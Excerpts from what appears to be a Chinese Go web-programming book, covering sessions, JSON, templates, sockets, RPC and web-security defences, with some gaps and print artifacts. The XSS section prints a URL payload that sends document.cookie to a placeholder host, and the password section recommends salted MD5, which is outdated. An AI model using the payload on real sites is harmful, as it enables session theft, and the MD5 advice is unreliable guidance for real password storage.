我们可以看到Open函数返回的是DB对象，里面有一个freeConn，它就是那个简易的连接池。它的实现相当简单或者说简陋，就是当执行 Db.prepare 的时候会 defer db.putConn(ci, err)，也就是把这个连接放入连接池，每次调用 conn 的时候会先判断freeConn的长度是否大于0，大于0说明有可以复用的conn，直接拿出来用就是，如果不大于0，则创建一个conn，然后再返回之。

### 5.3 使用SQLite数据库

SQLite 是一个开源的嵌入式关系数据库，实现自包容、零配置、支持事务的 SQL数据库引擎。其特点是高度便携、使用方便、结构紧凑、高效、可靠。与其他数据库管理系统不同，SQLite的安装和运行非常简单，在大多数情况下，只要确保SQLite的二进制文件存在，即可开始创建、连接和使用数据库。如果你正在寻找一个嵌入式数据库项目或解决方案，SQLite是绝对值得考虑。SQLite可以说是开源的Access。

### 5.4 使用PostgreSQL数据库

PostgreSQL和MySQL比较，更加庞大，因为它是为替代Oracle而设计的。所以在企业应用中采用PostgreSQL是一个明智的选择。

### 5.6 NOSQL数据库操作

目前流行的NOSQL主要有redis、mongoDB、Cassandra和Membase等。这些数据库都有高性能、高并发读写等特点

redis是一个key-value存储系统，和Memcached类似，它支持存储的value类型相对更多，包括string（字符串）、list（链表）、set（集合）和zset（有序集合）

### 第6章 Session和数据存储

Web里面经典的解决方案是Cookie和Session，Cookie机制是一种客户端机制，把用户数据保存在客户端，而Session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构来保存信息，每一个网站访客都会被分配给一个唯一的标志符，即 SessionID，它的存放形式无非两种，要么经过url传递，要么保存在客户端的Cookies里，当然，你也可以将Session保存到数据库里，这样会更安全，但效率方面会有所下降。

### 6.1 Session和Cookie

因为HTTP协议是无状态的，所以很显然服务器不可能知道我们已经在上一次的HTTP请求中通过了验证。当然，最简单的解决方案就是所有的请求里面都带上用户名和密码，这样虽然可行，但大大加重了服务器的负担（对于每个request都需要到数据库验证），也大大降低了用户体验（每个页面都需要重新输入用户名密码，每个页面都带有登录表单）。既然直接在请求中带上用户名与密码不可行，那么就只有在服务器或客户端保存一些类似的可以代表身份的信息，所以就有了Cookie与Session。

Cookie，简而言之就是在本地计算机保存一些用户操作的历史信息（当然包括登录信息），并在用户再次访问该站点时浏览器通过 HTTP 协议将本地 Cookie 内容发送给服务器，从而完成验证，或继续上一步操作。

Session，简而言之就是在服务器上保存用户操作的历史信息。服务器使用Session ID来标识Session，Session ID由服务器负责产生，保证随机性与唯一性，相当于一个随机密钥，避免在握手或传输中暴露用户真实密码。但该方式下，仍然需要将发送请求的客户端与 Session 进行对应，所以可以借助 Cookie 机制来获取客户端的标识（即 Session ID），也可以通过GET方式将ID提交给服务器。


Cookie是有时间限制的，根据生命期不同分成两种：会话Cookie和持久Cookie。
如果不设置过期时间，则表示这个 Cookie 生命周期为从创建到浏览器关闭止，只要关闭浏览器窗口，Cookie 就消失。这种生命期为浏览会话期的 Cookie 被称为会话Cookie。会话Cookie一般不保存在硬盘上而是保存在内存里。

如果设置了过期时间（setMaxAge(60*60*24)），浏览器就会把Cookie保存到硬盘上，关闭后再次打开浏览器，这些 Cookie 依然有效直到超过设定的过期时间。存储在硬盘上的Cookie可以在不同的浏览器进程间共享，比如两个IE窗口。而对于保存在内存的Cookie，不同的浏览器有不同的处理方式。

Go语言中通过net/http包中的SetCookie来设置。
￼
        http.SetCookie(w ResponseWriter, cookie *Cookie)
w表示需要写入的response，Cookie是一个struct，让我们来看一下Cookie对象是怎么样的。

Session和Cookie的目的相同，都是为了克服http协议无状态的缺陷，但完成的方法不同。Session通过Cookie，在客户端保存Session id，而将用户的其他会话消息保存在服务端的Session对象中，与此相对的，Cookie需要将所有信息都保存在客户端。

### 6.2 Go语言如何使用Session

Session 的基本原理是由服务器为每个会话维护一份信息数据，客户端和服务端依靠一个全局唯一的标识来访问这份数据，以达到交互的目的。当用户访问Web应用时，服务端程序会随需要创建Session，这个过程可以概括为三个步骤。

● 生成全局唯一标识符（SessionID）。
● 开辟数据存储空间。服务端程序一般会在内存中创建相应的数据结构，但这种情况下，系统一旦断电，所有的会话数据就会丢失，如果是电子商务类网站，这将造成严重的后果。所以为了解决这类问题，你可以将会话数据写到文件里或存储在数据库中，当然这样会增加I/O开销，但是它可以实现某种程度的Session持久化，也更有利于Session的共享。
● 将Session的全局唯一标示符发送给客户端。

● URL重写 所谓URL重写，就是在返回给用户的页面里的所有的URL后面追加Session 标识符，这样用户在收到响应之后，无论点击响应页面里的哪个链接或提交表单，都会自动带上Session标识符，从而就实现了会话的保持。

### 6.4 预防Session劫持

然后打开firefox的Cookie模拟插件，新建一个Cookie，把按上图中Cookie内容原样在firefox中重建一份。

Session一旦被其他人劫持，就非常危险，劫持者可以假装成被劫持者进行很多非法操作。那么如何有效的防止 Session 劫持呢？

其中一个解决方案就是SessionID的值只允许Cookie设置，而不是通过URL重置方式设置，同时设置Cookie的httponly为true，这个属性是设置是否可通过客户端脚本访问这个设置的Cookie，第一，这可以防止该Cookie被XSS读取从而引起Session劫持，第二，Cookie设置不会像URL重置方式那么容易获取SessionID。

第二步就是在每个请求里面加上token，实现类似前面章节里面讲的防止form重复递交类似的功能，我们在每个请求里面加上一个隐藏的token，然后每次验证这个token，从而保证用户的请求都是唯一性。

Session启动后，我们设置了一个值，用于记录生成SessionID的时间。通过判断每次请求是否过期（这里设置了 60 秒）定期生成新的 ID，这样使得攻击者获取有效SessionID的机会大大降低。

### 7.1 XML处理

Go语言具有反射机制，可以利用这些tag信息将来自XML文件中的数据反射成对应的struct对象

### 7.2 JSON处理

JSON由于比XML更小、更快，更易解析，以及浏览器的内建快速解析支持，使其更适用于网络数据传输领域。目前我们看到很多开放平台基本上都是采用了JSON作为其数据交互的接口。

            str := `{"servers":[{"serverName":"Shanghai_VPN","serverIP":"127.0.￼
    0.1"},{"serverName":"Beijing_VPN","serverIP":"127.0.0.2"}]}`￼
            json.Unmarshal([]byte(str), &s)￼

我们首先定义了与 JSON 数据对应的结构体，数组对应slice，字段名对应JSON里面的key，在解析的时候，如何将JSON数据与struct字段相匹配呢？例如JSON的key是Foo，那么怎么找对应的字段呢？


我们假设有如下JSON数据。
￼
        b := []byte(`{"Name":"Wednesday","Age":6,"Parents":["Gomez","Morticia"]}`)
如果在我们不知道结构的情况下，我们把它解析到interface{}里面。
￼
        var f interface{}￼
        err := json.Unmarshal(b, &f)

那么如何来访问这些数据呢？可通过断言的方式。
￼
        m := f.(map[string]interface{})
通过断言之后，你就可以通过如下方式来访问里面的数据了。

switch vv := v.(type) {￼
            case string:￼
                fmt.Println(k, "is string", vv)￼
            case int:￼
                fmt.Println(k, "is int", vv)￼
            case []interface{}:￼
                fmt.Println(k, "is an array:")￼
                for i, u := range vv {￼
                    fmt.Println(i, u)￼
                }￼

针对JSON的输出，我们在定义struct tag的时候需要注意以下几点。
● 如果字段的tag是"-"，那么这个字段不会输出到JSON。
● 如果tag中带有自定义名称，那么这个自定义名称会出现在JSON的字段名中，例如上面例子中的serverName。
● 如果tag中带有"omitempty"选项，那么如果该字段值为空，就不会输出到JSON串中。
● 如果字段类型是bool、string、int、int64等，而tag中带有",string"选项，那么这个字段在输出到JSON的时候会把该字段对应的值转换成JSON字符串。

### 7.3 正则处理

上面三个函数实现了同一个功能，即判断pattern是否和输入源匹配，若匹配，就返回true，如果解析正则出错，则返回error。三个函数的输入源分别是byte slice、RuneReader和string。

Match模式只能用于对字符串的判断，无法截取字符串的一部分、过滤字符串，或者提取出符合条件的一批字符串。如果想要满足这些需求，那就需要使用正则表达式的复杂模式。

下面就以爬虫为例说明如何使用正则来过滤或截取抓取到的数据。

src := string(body)￼
            //将HTML标签全转换成小写￼
            re, _ := regexp.Compile("\\<[\\S\\s]+?\\>")￼
            src = re.ReplaceAllStringFunc(src, strings.ToLower)￼
            //去除STYLE￼
            re, _ = regexp.Compile("\\<style[\\S\\s]+?\\</style\\>")￼
            src = re.ReplaceAllString(src, "")￼
            //去除SCRIPT￼
            re, _ = regexp.Compile("\\<script[\\S\\s]+?\\</script\\>")￼
            src = re.ReplaceAllString(src, "")￼
            //去除所有尖括号内的HTML代码，并换成换行符￼
            re, _ = regexp.Compile("\\<[\\S\\s]+?\\>")￼
            src = re.ReplaceAllString(src, "\n")￼
            //去除连续的换行符￼
            re, _ = regexp.Compile("\\s{2,}")￼
            src = re.ReplaceAllString(src, "\n")￼
            fmt.Println(strings.TrimSpace(src))￼
        }

我们根据输入源（byte slice、string和io.RuneReader）不同还可以将这18个函数继续简化成如下几个，其他的只是输入源不一样，其功能基本是一样的。

### 7.4 模板处理

Web应用反馈给客户端的信息中的大部分内容是静态不变的，而另外少部分是根据用户的请求来动态生成的，例如，要显示用户的访问记录列表，用户之间只有记录数据是不同的，列表的样式则是固定的，此时采用模板可以复用很多静态代码。

在Go语言中，我们使用template包来进行模板处理，使用类似Parse、ParseFile、Execute 等方法从文件或者字符串加载模板，

            t := template.New("some template") //创建一个模板￼
            t, _ = t.ParseFiles("tmpl/welcome.html", nil)  //解析模板文件￼
            user := GetUser() //获取当前用户信息￼
            t.Execute(w, user)  //执行模板的merger操作￼

为了方便演示和测试代码，我们在接下来的例子中采用如下格式的代码。
● 使用Parse代替ParseFiles，因为Parse可以直接测试一个字符串，而不需要额外的文件。
● 不使用handler来写演示代码，而是每个测试有一个main，方便测试。
● 使用os.Stdout代替http.ResponseWriter，因为os.Stdout实现了io.Writer接口。

一个模板都是应用在一个Go语言的对象之上，Go语言对象的字段如何插入到模板中呢？
字段操作
Go语言的模板通过{{}}来包含需要在渲染时被替换的字段，{{.}}表示当前的对象，这和Java或者C++中的this类似，如果要访问当前对象的字段，通过{{.FieldName}}，但是需要注意一点，这个字段必须是导出的（字段首字母必须大写），否则在渲染的时候就会报错，请看下面的这个例子。

输出嵌套字段内容
上面的例子展示了如何针对一个对象的字段输出，那么如果字段里面还有对象，如何来循环输出这些内容呢？我们可以使用{{with …}}…{{end}}和{{range …}}{{end}}来进行数据的输出。
● {{range}} 和Go语言语法里面的range类似，循环操作数据。
● {{with}}操作是指当前对象的值，类似上下文的概念。

Go语言通过申明的局部变量格式如下所示。
￼
        $variable := pipeline

Go语言通过如下的语法来申明。
￼
        {{define "子模板名称"}}内容{{end}}
通过如下方式来调用。
￼
        {{template "子模板名称"}}

### 7.5 文件操作

● func MkdirAll(path string, perm FileMode) error
根据path创建多级子目录，例如astaxie/test1/test2。
● func Remove(name string) error
删除名称为name的目录，当目录下有文件或者其他目录会出错。
● func RemoveAll(path string) error
根据path删除多级子目录，如果path是单个名称，那么该目录不删除。

  func main() {￼
            os.Mkdir("astaxie", 0777)￼
            os.MkdirAll("astaxie/test1/test2", 0777)￼
            err := os.Remove("astaxie")￼
            if err != nil {￼
                fmt.Println(err)￼
            }￼
            os.RemoveAll("astaxie")￼
        }

可以通过如下两个方法新建文件。
● func Create(name string) (file *File, err Error)
根据提供的文件名创建新的文件，返回一个文件对象，默认权限是 0666 的文件，返回的文件对象是可读写的。
● func NewFile(fd uintptr, name string) *File
根据文件描述符创建相应的文件，返回一个文件对象。

● func (file *File) Write(b []byte) (n int, err Error)
写入byte类型的信息到文件。
● func (file *File) WriteAt(b []byte, off int64) (n int, err Error)
在指定位置开始写入byte类型的信息。
● func (file *File) WriteString(s string) (ret int, err Error)
写入string信息到文件。


读文件函数。
● func (file *File) Read(b []byte) (n int, err Error)
读取数据到b中。
● func (file *File) ReadAt(b []byte, off int64) (n int, err Error)
从off开始读取数据到b中。

### 7.6 字符串处理

下面这些函数来自于strings包，主要是笔者常用的函数，更详细的请参考官方的文档。
● func Contains(s, substr string) bool
字符串s中是否包含substr，返回bool值。

● func Join(a []string, sep string) string
字符串链接，把slice a通过sep链接起来。
￼
        s := []string{"foo", "bar", "baz"}￼
        fmt.Println(strings.Join(s, ", "))￼
        //Output:foo, bar, baz

● func Repeat(s string, count int) string
重复s字符串count次，最后返回重复的字符串。
￼
        fmt.Println("ba" + strings.Repeat("na", 2))￼
        //Output:banana

● func Split(s, sep string) []string
把s字符串按照sep分割，返回slice。
￼
        fmt.Printf("%!q(MISSING)\n", strings.Split("a,b,c", ","))￼

● func Fields(s string) []string
去除s字符串的空格符，并且按照空格分割返回slice。
￼
        fmt.Printf("Fields are: %!q(MISSING)", strings.Fields("  foo bar  baz   "))￼
        //Output:Fields are: ["foo" "bar" "baz"]

### 第8章 Web服务

Go语言是21世纪的C语言，我们追求的是性能、简单，所以我们将在第8.1节介绍如何使用Socket编程，很多游戏服务都是采用Socket来编写服务端，因为HTTP协议相对而言比较耗费性能，让我们看看Go语言如何来Socket编程。

### 8.1 Socket编程

Socket起源于Unix，而Unix基本哲学之一就是“一切皆文件”，都可以用“打开open→读写write/read→关闭close”模式来操作。Socket就是该模式的一个实现，网络的Socket数据传输是一种特殊的I/O，Socket也是一种文件描述符。Socket也具有一个类似于打开文件的函数调用：Socket()，该函数返回一个整型的Socket描述符，随后的连接建立、数据传输等操作都是通过该Socket实现。

常用的 Socket 类型有两种：流式 Socket（SOCK_STREAM）和数据报式 Socket （SOCK_DGRAM）。流式是一种面向连接的Socket，针对于面向连接的TCP服务应用；数据报式Socket是一种无连接的Socket，对应于无连接的UDP服务应用。


网络中的进程之间如何通过 Socket 通信呢？首要解决的问题是如何唯一标识一个进程，否则通信无从谈起！在本地可以通过进程PID来唯一标识一个进程，但是在网络中这是行不通的。其实TCP/IP协议族已经帮我们解决了这个问题，网络层的“IP地址”可以唯一标识网络中的主机，而传输层的“协议+端口”可以唯一标识主机中的应用程序（进程）。这样利用三元组（IP地址，协议，端口）就可以标识网络的进程了，网络中需要互相通信的进程，就可以利用这个标志在他们之间进行交互。

ParseIP(s string) IP函数会把一个IPv4或者IPv6的地址转化成IP类型

name := os.Args[1]￼
            addr := net.ParseIP(name)￼
            if addr == nil {￼
                fmt.Println("Invalid address")￼
            } else {￼
                fmt.Println("The address is ", addr.String())￼
            }￼

在Go语言的net包中有一个类型TCPConn，这个类型可以用来作为客户端和服务器端交互的通道，它有两个主要的函数。
￼
        func (c *TCPConn) Write(b []byte) (n int, err os.Error)￼
        func (c *TCPConn) Read(b []byte) (n int, err os.Error)
TCPConn可在客户端和服务器端来读写数据。

type TCPAddr struct {￼
            IP IP￼
            Port int￼
        }
在Go语言中通过ResolveTCPAddr获取一个TCPAddr。
￼
        func ResolveTCPAddr(net, addr string) (*TCPAddr, os.Error)

● addr表示域名或者IP地址，例如"www.google.com:80" 或者"127.0.0.1:22"。


TCP client
Go语言通过net包中的DialTCP函数来建立一个TCP连接，并返回一个TCPConn类型的对象，当连接建立时服务器端也创建一个同类型的对象，此时客户端和服务器端通过各自拥有的TCPConn对象来进行数据交换。一般而言，客户端通过TCPConn对象将请求信息发送到服务器端，读取服务器端响应的信息。服务器端读取并解析来自客户端的请求，并返回应答信息，这个连接只有当任一端关闭了连接之后才失效，不然这连接可以一直使用。建立连接的函数定义如下。
￼
        func DialTCP(net string, laddr, raddr *TCPAddr) (c *TCPConn, err os.Error)

● net参数是"tcp4"、"tcp6"、"tcp"中的任意一个，分别表示TCP（IPv4-only）、TCP （IPv6-only）或者TCP（IPv4，IPv6的任意一个）。


conn, err := net.DialTCP("tcp", nil, tcpAddr)￼
            checkError(err)￼
            _, err = conn.Write([]byte("HEAD / HTTP/1.0\r\n\r\n"))￼
            checkError(err)￼
            result, err := ioutil.ReadAll(conn)￼
            checkError(err)￼
            fmt.Println(string(result))￼
            os.Exit(0)￼

conn, err := listener.Accept()￼
                if err != nil {￼
                    continue￼
                }￼
                daytime := time. Now ().String()￼
                conn.Write([]byte(daytime)) // don't care about return value￼
                conn.Close()                 // we're finished with this client￼

在代码中for循环里，当有错误发生时，直接continue而不是退出，是因为在服务器端运行代码的时候，当有错误发生的情况下最好是由服务端记录错误，当前连接的客户端直接报错而退出，从而不会影响到当前服务端运行的整个服务。

go handleClient(conn)￼

控制TCP连接
TCP有很多连接控制函数，我们平常用到比较多的函数有如下几个。
￼
        func (c *TCPConn) SetTimeout(nsec int64) os.Error￼
        func (c *TCPConn) SetKeepAlive(keepalive bool) os.Error
第一个函数用来设置连接的超时时间，客户端和服务器端都适用，当超过设置的时间时该连接就会失效。
第二个函数用来设置客户端是否和服务器端一直保持着连接，即使没有任何的数据发送。

### 8.2 WebSocket

WebSocket是HTML5的重要特性，它实现了基于浏览器的远程Socket，使浏览器和服务器可以进行全双工通信，许多浏览器（Firefox、Google Chrome和Safari）都已对此做了支持。
在WebSocket出现之前，为了实现即时通信，采用的技术都是“轮询”，即在特定的时间间隔内，由浏览器对服务器发出HTTP Request，服务器在收到请求后，返回最新的数据给浏览器刷新，“轮询”使得浏览器需要对服务器不断发出请求，这样会占用大量带宽。

WebSocket采用了一些特殊的报头，使得浏览器和服务器只需要做一个握手的动作，就可以在浏览器和服务器之间建立一条连接通道。且此连接会保持在活动状态，你可以使用JavaScript来向连接写入或从中接收数据，就像在使用一个常规的TCP Socket一样。它解决了Web实时化的问题，相比传统HTTP有如下好处。

● 一个Web客户端只建立一个TCP连接。
● Websocket服务端可以推送数据到Web客户端。
● 有更加轻量级的头，减少数据传送量。
WebSocket URL的起始输入是ws://或是wss:/（/ 在SSL上）。图8.2展示了WebSocket的通信过程，一个带有特定报头的HTTP握手被发送到了服务器端，接着在服务器端或是客户端就可以通过 JavaScript 来使用某种套接口（Socket），这一套接口可被用来通过事件句柄异步地接收数据。

对该字符串先用sha1安全散列算法计算出二进制的值，然后用base64对其进行编码，即可以得到握手后的字符串。
￼
        rE91AJhfC+6JdVcVXOGJEADEJdQ=
将此作为响应头Sec-WebSocket-Accept的值反馈给客户端。

客户端JS很容易就通过WebSocket函数建立了一个与服务器的连接sock，当握手成功后，会触发WebScoket对象的onopen事件，告诉客户端连接已经成功建立。客户端一共绑定了四个事件。
● onopen 建立连接后触发。
● onmessage 收到消息后触发。
● onerror 发生错误时触发。
● onclose 关闭连接时触发。

### 8.3 REST

● 资源（Resources） REST 是“表现层状态转化”，其实它省略了主语。“表现层”其实指的是“资源”的“表现层”。

Go语言没有为REST提供直接支持，但是因为RESTful是基于HTTP协议实现的，所以我们可以利用net/http包来自己实现，当然需要针对REST做一些改造，REST是根据不同的method来处理相应的资源

REST是一种架构风格，汲取了WWW的成功经验：无状态，以资源为中心，充分利用HTTP协议和URI协议，提供统一的接口定义，使得它作为一种设计Web服务的方法而变得流行。

REST是一种架构风格，汲取了WWW的成功经验：无状态，以资源为中心，充分利用HTTP协议和URI协议，提供统一的接口定义，使得它作为一种设计Web服务的方法而变得流行

### 8.4 RPC

RPC就是想实现函数调用模式的网络化。客户端就像调用本地函数一样，把这些参数打包之后通过网络传递到服务端，服务端解包到处理过程中执行，然后执行的结果反馈给客户端。RPC（Remote Procedure Call Protocol）——远程过程调用协议，是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。它假定某些传输协议的存在，如TCP或UDP，以便为通信程序之间携带信息数据。通过它可以使函数调用模式网络化。在 OSI 网络通信模型中，RPC 跨越了传输层和应用层。RPC 使得开发包括网络分布式多程序在内的应用程序更加容易。

图8.8 RPC工作流程图
1.调用客户端句柄，执行传送参数。
2.调用本地系统内核发送网络消息。
3.消息传送到远程主机。
4.服务器句柄得到消息并取得参数。
5.执行远程过程。
6.执行的过程将结果返回服务器句柄。
7.服务器句柄返回结果，调用远程系统内核。
8.消息传回本地主机。
9.客户句柄由内核接收消息。
10.客户接收句柄返回的数据。

Go语言标准包中已经提供了对RPC的支持，而且支持三个级别的RPC：TCP、HTTP和JSONRPC。但Go语言的RPC包是独一无二的RPC，它和传统的RPC系统不同，它只支持Go语言开发的服务器与客户端之间的交互，因为在内部，它们采用了Gob来编码。

任何RPC都需要通过网络来传递数据，Go RPC可以利用HTTP和TCP来传递数据。利用HTTP的好处是可以直接复用net/http里面的一些函数。

JSON RPC是数据编码采用了JSON，而不是gob编码，其他和上面介绍的RPC概念一样，下面我们来演示一下，如何使用Go语言提供的json-rpc标准包，请看服务端代码的实现。

通过示例我们可以看出 json-rpc 是基于 TCP 协议实现的，目前它还不支持 HTTP方式。

### 9.1 预防CSRF攻击

CSRF（Cross-Site Request Forgery），跨站请求伪造，也被称为one click attack/session riding，缩写为CSRF/XSRF。
那么CSRF到底能够干什么呢？可以简单理解为：攻击者可以盗用你的登录信息，以你的身份模拟发送各种请求。攻击者只要借助少许的社会工程学的诡计，例如通过QQ 等聊天软件发送的链接（有些还伪装成短域名，用户无法分辨），攻击者就能迫使Web应用的用户去执行攻击者预设的操作。

例如，当用户登录网络银行去查看其存款余额，在他没有退出时，就点击了一个QQ好友发来的链接，那么该用户银行账户中的资金就有可能被转移到攻击者指定的账户中。

要完成一次CSRF攻击，受害者必须依次完成两个步骤。
1.登录受信任网站A，并在本地生成Cookie 。
2.在不退出A的情况下，访问危险网站B。

但你不能保证以下情况不会发生。
● 你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站，尤其是现在浏览器都是支持多tab的。
● 你不能保证你关闭浏览器了后，本地的 Cookie立刻过期，上次的会话已经结束。
● 上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。

Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。

这样处理后，因为我们限定了修改只能使用POST，当GET方式请求时就拒绝响应，所以上面图示中 GET 方式就可以防止 CSRF 的攻击，但这样就能全部解决问题了吗？当然不是，因为POST也是可以模拟的。

1.为每个用户生成一个唯一的cookie token，所有表单都包含同一个伪随机值，这种方案最简单，因为理论上攻击者不能获得第三方的Cookie，所以表单中的数据也就构造失败，但是由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，所以这个方案必须在没有XSS的情况下才安全。

3.不同的表单包含一个不同的伪随机值，我们在第4.4节介绍“防止多次递交表单”时介绍过此方案，复用相关代码，实现如下。
生成随机数token。

### 9.2 确保输入过滤

知道数据来源之后，就可以过滤它了。过滤是一个有点正式的术语，它在平时表述中有很多同义词，如验证、清洁及净化。尽管这些术语表面意义不同，但它们都是指同一个处理：防止非法数据进入应用。

CleanMap := make(map[string]interface{}, 0)￼

### 9.3 避免XSS攻击

动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS）的威胁，而静态站点则完全不受其影响。

XSS攻击：跨站脚本攻击（Cross-Site Scripting），为了不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。XSS 是一种常见的Web安全漏洞，它允许攻击者将恶意代码植入到提供给其他用户使用的页面中。不同于大多数攻击（一般只涉及攻击者和受害者），XSS涉及三方，即攻击者、客户端与Web应用。XSS 的攻击目标是为了盗取存储在客户端的 Cookie 或者其他网站用于识别客户端身份的敏感信息。一旦获取到合法用户的信息后，攻击者甚至可以假冒合法用户与网站进行交互。

XSS通常可以分为两大类：一类是存储型XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程可以简单描述为：恶意用户的 Html 输入Web程序→进入数据库→Web程序→用户浏览器。另一类是反射型XSS，主要做法是将脚本代码加入 URL 地址的请求参数，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。

● 利用 iframe、frame、XMLHttpRequest 或上述 Flash 等方式，以（被攻击者）用户的身份执行一些管理动作，或执行发微博、加好友、发私信等常规操作，新浪微博就曾遭遇过一次XSS。

Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入 HTML 代码（最主要的是“>”、“<”），并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。

那么恶意用户是如何盗取Cookie的呢 与上类似，如下这样的URL：http://127.0.0.1/? name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.co okie&#60;/script&#62;，可以把当前的 Cookie 发送到指定的站点：www.xxx.com。你也许会说，这样的URL一看就有问题，怎么会有人点击？是的，这类URL会让人怀疑，但如果使用短网址服务将之缩短，你还看得出来么？攻击者将缩短过后的 URL 通过某些途径传播开来，不明真相的用户一旦点击了这样的URL，相应Cookie数据就被发送到事先设定好的站点，这样就盗得了用户的Cookie信息，然后就可以利用Websleuth之类的工具来检查是否能盗取该用户的账户。

答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。

### 9.4 避免SQL注入

SQL注入攻击（SQL Injection），简称注入攻击，是Web开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。
而造成 SQL 注入的原因是程序没有有效过滤用户的输入，使攻击者成功向服务器提交恶意的 SQL 查询代码，程序在接收后错误地将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外执行了攻击者精心构造的恶意代码。

很多Web开发者没有意识到SQL查询是可以被篡改的，从而把SQL查询当作可信任的命令。殊不知，SQL查询是可以绕开访问控制，从而绕过身份验证和权限检查的。更有甚者，有可能通过SQL查询去运行主机系统级的命令。

在SQL里面--是注释标记，所以查询语句会在此中断。这就让攻击者在不知道任何合法用户名和密码的情况下成功登录了。

也许你会指出，攻击者得知道数据库结构的信息才能实施 SQL 注入攻击。确实如此，但没人能保证攻击者一定拿不到这些信息，一旦他们拿到了，数据库就存在泄露的危险。如果你用开放源代码的软件包来访问数据库，比如论坛程序，攻击者就很容易得到相关的代码。如果这些代码设计不良的话，风险就更大了。目前 Discuz、phpwind、phpcms等流行的开源程序都有被SQL注入攻击的先例。

SQL注入攻击的危害这么大，那么该如何来防治呢?下面这些建议或许对防治SQL注入有一定的帮助。
1.严格限制Web应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度减少注入攻击对数据库的危害。
2.检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用regexp 包进行一些匹配处理，或者使用 strconv 包对字符串转化成其他基本类型的数据进行判断。
3.对进入数据库的特殊字符（'"\尖括号&*;等）进行转义处理，或编码转换。Go语言的text/template包里面的HTMLEscapeString函数可以对字符串进行转义处理。

4.所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如使用database/sql里面的查询函数Prepare和Query，或者Exec(query string, args ...interface{})。

6.避免网站打印出SQL错误信息，比如类型错误、字段不匹配等，把代码里的SQL语句暴露出来，以防止攻击者利用这些错误信息进行SQL注入。


### 9.5 存储密码

目前用得最多的密码存储方案是将明文密码做单向哈希后存储，单向哈希算法有一个特征：无法通过哈希后的摘要（digest）恢复原始数据，这也是“单向”二字的来源。常用的单向哈希算法包括SHA-256、SHA-1、MD5等。

单向哈希有两个特性。
1.同一个密码进行单向哈希，得到的总是唯一确定的摘要。
2.计算速度快。随着技术进步，一秒钟能够完成数十亿次单向哈希计算。
结合上面两个特点，考虑到多数人所使用的密码为常见的组合，攻击者可以将所有密码的常见组合进行单向哈希，得到一个摘要组合，然后与数据库中的摘要进行比对即可获得对应的密码。这个摘要组合也被称为rainbow table。

因此通过单向加密之后存储的数据，和明文存储没有多大区别。因此，一旦网站的数据库泄露，所有用户的密码就大白于天下。

通过上面介绍我们知道黑客可以用rainbow table来破解哈希后的密码，很大程度上是因为加密时使用的哈希算法是公开的。如果黑客不知道加密的哈希算法是什么，那他也就无从下手了。
一个直接的解决办法是，自己设计一个哈希算法。然而，一个好的哈希算法是很难设计的——既要避免碰撞，又不能有明显的规律，做到这两点要比想象中的要困难很多。因此实际应用中更多的是利用已有的哈希算法进行多次哈希。
但是单纯的多次哈希，依然阻挡不住黑客。两次 MD5、三次 MD5 之类的方法，我们能想到，黑客自然也能想到。特别是对于一些开源代码，这样哈希更是相当于直接把算法告诉了黑客。

没有攻不破的盾，但也没有折不断的矛。现在安全性比较好的网站，都会用一种叫做“加盐”的方式来存储密码，也就是常说的“salt”。他们通常的做法是，先将用户输入的密码进行一次 MD5（或其他哈希算法）加密；将得到的 MD5 值前后加上一些只有管理员自己知道的随机串，再进行一次MD5加密。这个随机串中可以包括某些固定的串，也可以包括用户名（用来保证每个用户加密使用的密钥都不一样）。

### 9.6 加密和解密数据

func base64Encode(src []byte) []byte {￼
            return []byte(base64.StdEncoding.EncodeToString(src))￼
        }￼
        func base64Decode(src []byte) ([]byte, error) {￼
            return base64.StdEncoding.DecodeString(string(src))￼
        }￼

 // encode￼
            hello := "你好，世界！ hello world"￼
            debyte := base64Encode([]byte(hello))￼
            fmt.Println(debyte)￼
            // decode￼
            enbyte, err := base64Decode(debyte)￼

Go语言的crypto里面支持对称加密的高级加解密包有如下两种。
● crypto/aes包：AES（Advanced Encryption Standard），又称Rijndael加密法，是美国联邦政府采用的一种区块加密标准。
● crypto/des包：DEA（Data Encryption Algorithm），一种对称加密算法，是目前使用最广泛的密钥系统，特别是在保护金融数据的安全中。

### 第10章 国际化和本地化

国际化与本地化（Internationalization and localization，通常用i18n和L10N表示），国际化是将针对某个地区设计的程序进行重构，以使它能够在更多地区使用，本地化是指在一个面向国际化的程序中增加对新地区的支持。

所谓的国际化，就是根据特定的locale信息，提取与之相应的字符串或其他一些东西（比如时间和货币的格式）等等。这涉及三个问题：
1.如何确定locale。
2.如何保存与locale相关的字符串或其他信息。
3.如何根据locale提取字符串和其他相应的信息。

### 10.1 设置默认地区

